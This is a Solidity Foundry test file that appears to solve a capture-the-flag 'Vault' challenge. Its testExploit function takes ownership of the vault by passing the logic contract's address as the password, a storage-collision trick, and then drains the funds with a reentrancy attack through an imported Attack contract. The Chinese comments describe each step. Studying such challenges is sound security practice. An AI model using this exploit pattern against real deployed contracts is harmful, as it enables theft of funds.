// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";
import "../src/attack.sol";




contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;

    address owner = address (1);
    address palyer = address (2);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 1 ether}();
        vm.stopPrank();

    }

    function testExploit() public {
        vm.deal(palyer, 1 ether);
        vm.startPrank(palyer);

        // add your hacker code.
        Attack attacker = new Attack(address(vault));
        vm.deal(address(attacker), 1 ether);
        bytes32 password = bytes32(uint256(uint160(address(logic)))); // 补齐32字节
        bytes memory data = abi.encodeWithSelector(logic.changeOwner.selector, password, address(attacker));
        (bool result,) = address(vault).call(data); // 修改合约的owner
        require(result, "call failed");
        address owner1 = vault.owner();
        require(owner1 == address(attacker), "failed");
        vm.stopPrank();

        vm.startPrank(address(attacker));
        vault.openWithdraw();
        // 先往合约里存入一些钱
        vault.deposite{value: 0.1 ether}();
        // 重入攻击取走合约里的钱
        vault.withdraw();
        vm.stopPrank();

        vm.prank(palyer);
        attacker.withdraw();

        require(palyer.balance == 3 ether, "failed");
        require(vault.isSolve(), "solved");
    }

}
